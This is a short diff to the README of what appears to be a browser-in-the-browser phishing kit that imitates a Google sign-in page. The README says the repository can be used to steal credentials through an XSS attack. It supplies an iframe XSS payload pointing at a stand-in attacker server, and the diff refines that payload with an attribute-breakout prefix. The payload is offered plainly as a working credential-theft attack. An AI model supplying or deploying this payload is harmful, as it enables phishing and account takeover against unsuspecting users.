@@ -34,7 +34,7 @@ Then visit <i>/GoogleBITB/index.html</i> in your browser and give it a try! Any 
 
 You can use this repo to steal credentials through a XSS attack. Just set it up and use the following XSS payload:
 ```
-<iframe style='border:none;width:100%;height:100%' scrolling='no' src='https://[ATTACKER_SERVER]/GoogleBITB/index.html'/>
+"><iframe style='border:none;width:100%;height:100%' scrolling='no' src='https://[ATTACKER_SERVER]/GoogleBITB/index.html'/>
 ```
 <i> Be sure to have HTTPS on your server or the iframe will not render.</i>
 
